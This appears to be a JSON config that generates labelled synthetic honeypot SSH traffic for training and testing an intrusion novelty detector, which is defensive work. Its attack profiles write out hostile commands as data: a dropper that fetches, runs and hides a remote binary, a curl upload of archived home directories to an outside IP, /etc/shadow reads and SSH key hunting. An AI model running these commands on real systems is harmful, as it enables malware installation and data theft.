{
  "version": "2.0.0",
  "description": "Labelled traffic profiles for the honeypot dataset release. Each profile mirrors the style of configs/attack_profiles.json but adds a ground-truth category/label, randomised credentials, and optional steps so sessions are not near-duplicates. Steps: a command string, a list of alternatives (one is chosen), or {\"p\": probability, \"cmd\": ...} for an optional step. {placeholders} are filled from the pools below; held_out profiles are kept out of the DEC training set to test novelty detection.",

  "placeholders": {
    "ip": ["185.220.101.5", "193.27.228.11", "45.154.255.85", "103.145.13.92"],
    "lan_ip": ["10.0.0.5", "10.0.0.12", "192.168.1.10", "172.16.0.8"],
    "domain": ["example.com", "files-mirror.org", "pkg-repo.xyz"],
    "bin": ["b.sh", "malware.sh", "update.sh", "payload"],
    "user": ["support", "sysbackup", "ftpuser"],
    "dir": ["/tmp", "/var/tmp", "/dev/shm"]
  },

  "profiles": [
    {
      "name": "benign_admin",
      "attack_cat": "benign",
      "label": 0,
      "held_out": false,
      "description": "Ordinary administrator housekeeping with human pacing.",
      "credentials": {"usernames": ["admin", "ubuntu", "deploy"], "passwords": ["Adm1n#2026", "Welcome@123", "0psTeam#7"], "failed_attempts": [0, 1]},
      "delay_range": [2.0, 7.0],
      "steps": [
        ["uptime", "w", "who"],
        ["df -h", "du -sh /var/log"],
        {"p": 0.7, "cmd": ["free -m", "cat /proc/meminfo"]},
        {"p": 0.6, "cmd": ["systemctl status ssh", "service cron status"]},
        {"p": 0.5, "cmd": ["tail -n 50 /var/log/syslog", "journalctl -n 20"]},
        {"p": 0.4, "cmd": ["cat /etc/os-release", "date"]}
      ],
      "noise_pool": ["pwd", "clear", "ls", "date"],
      "noise_count": [0, 2]
    },
    {
      "name": "reconnaissance",
      "attack_cat": "reconnaissance",
      "label": 1,
      "held_out": false,
      "description": "Host fingerprinting after login: identity, kernel, users, network.",
      "credentials": {"usernames": ["root", "admin", "user", "test"], "passwords": ["admin", "password", "1234", "toor"], "failed_attempts": [0, 2]},
      "delay_range": [0.5, 3.0],
      "steps": [
        ["whoami", "id"],
        ["uname -a", "uname -r"],
        {"p": 0.8, "cmd": ["cat /etc/passwd", "cat /etc/group"]},
        {"p": 0.7, "cmd": ["ifconfig", "ip a", "ip route"]},
        {"p": 0.6, "cmd": ["ps aux", "ss -tulpn"]},
        {"p": 0.5, "cmd": ["hostname", "cat /etc/issue"]},
        {"p": 0.4, "cmd": ["lscpu", "nproc"]}
      ],
      "noise_pool": ["pwd", "ls -la", "ls"],
      "noise_count": [0, 2]
    },
    {
      "name": "brute_force",
      "attack_cat": "brute_force",
      "label": 1,
      "held_out": false,
      "description": "Credential guessing with several failed logins, then a short check or disconnect.",
      "credentials": {"usernames": ["root", "admin", "pi", "oracle"], "passwords": ["admin", "raspberry", "oracle", "12345678"], "failed_attempts": [3, 5]},
      "delay_range": [0.1, 0.8],
      "steps": [
        {"p": 0.5, "cmd": ["uname -a", "whoami", "echo ok"]}
      ],
      "noise_pool": [],
      "noise_count": [0, 0]
    },
    {
      "name": "botnet",
      "attack_cat": "botnet",
      "label": 1,
      "held_out": false,
      "description": "Mirai-style dropper: fetch a file, make it executable, run it, clean up.",
      "credentials": {"usernames": ["root", "admin", "support"], "passwords": ["admin", "1234", "support", "default"], "failed_attempts": [0, 2]},
      "delay_range": [0.1, 1.0],
      "steps": [
        ["cd {dir}"],
        ["wget http://{ip}/{bin}", "curl -O http://{domain}/{bin}"],
        ["chmod +x {bin}", "chmod 777 {bin}"],
        ["./{bin}", "sh {bin}"],
        {"p": 0.7, "cmd": ["rm -rf {bin}", "rm {bin}"]},
        {"p": 0.3, "cmd": ["history -c", "unset HISTFILE"]}
      ],
      "noise_pool": ["enable", "system", "shell"],
      "noise_count": [0, 2]
    },
    {
      "name": "privilege_escalation",
      "attack_cat": "privilege_escalation",
      "label": 1,
      "held_out": false,
      "description": "Searching for misconfigurations and secrets that grant root.",
      "credentials": {"usernames": ["user", "www-data", "guest"], "passwords": ["user", "guest", "password1"], "failed_attempts": [0, 1]},
      "delay_range": [1.0, 5.0],
      "steps": [
        ["id", "whoami"],
        ["sudo -l"],
        {"p": 0.8, "cmd": ["find / -perm -4000 -type f 2>/dev/null"]},
        {"p": 0.7, "cmd": ["cat /etc/shadow", "ls -la /etc/shadow"]},
        {"p": 0.6, "cmd": ["find / -name id_rsa 2>/dev/null", "ls -la /root/.ssh"]},
        {"p": 0.5, "cmd": ["cat /etc/crontab", "crontab -l"]}
      ],
      "noise_pool": ["ls -la", "pwd"],
      "noise_count": [0, 2]
    },
    {
      "name": "lateral_movement",
      "attack_cat": "lateral_movement",
      "label": 1,
      "held_out": false,
      "description": "Internal discovery and attempts to reach other hosts.",
      "credentials": {"usernames": ["root", "admin", "svc_backup"], "passwords": ["Summer2026!", "admin@123", "backup"], "failed_attempts": [0, 1]},
      "delay_range": [1.0, 4.0],
      "steps": [
        ["ip route", "arp -a", "cat /etc/hosts"],
        {"p": 0.8, "cmd": ["cat ~/.ssh/known_hosts", "cat ~/.bash_history"]},
        {"p": 0.7, "cmd": ["ping -c 2 {lan_ip}", "nc -zv {lan_ip} 22"]},
        {"p": 0.6, "cmd": ["ssh root@{lan_ip}", "ssh -o StrictHostKeyChecking=no admin@{lan_ip}"]},
        {"p": 0.4, "cmd": ["nmap -sn 10.0.0.0/24"]}
      ],
      "noise_pool": ["whoami", "hostname"],
      "noise_count": [0, 1]
    },
    {
      "name": "data_exfiltration",
      "attack_cat": "exfiltration",
      "label": 1,
      "held_out": true,
      "description": "HELD OUT (novel): locating and copying out data files. Excluded from DEC training to test novelty detection.",
      "credentials": {"usernames": ["root", "backup"], "passwords": ["backup123", "admin2026"], "failed_attempts": [0, 1]},
      "delay_range": [0.5, 3.0],
      "steps": [
        ["find / -name '*.sql' 2>/dev/null", "find /home -name '*.db' 2>/dev/null"],
        {"p": 0.7, "cmd": ["du -sh /home /var/www", "ls -la /var/backups"]},
        ["tar czf {dir}/d.tgz /home", "tar cf {dir}/d.tar /var/www"],
        {"p": 0.8, "cmd": ["curl -T {dir}/d.tgz http://{ip}/u", "scp {dir}/d.tar root@{lan_ip}:/tmp/"]},
        {"p": 0.5, "cmd": ["rm -f {dir}/d.tgz {dir}/d.tar"]}
      ],
      "noise_pool": ["id", "ls"],
      "noise_count": [0, 1]
    }
  ]
}
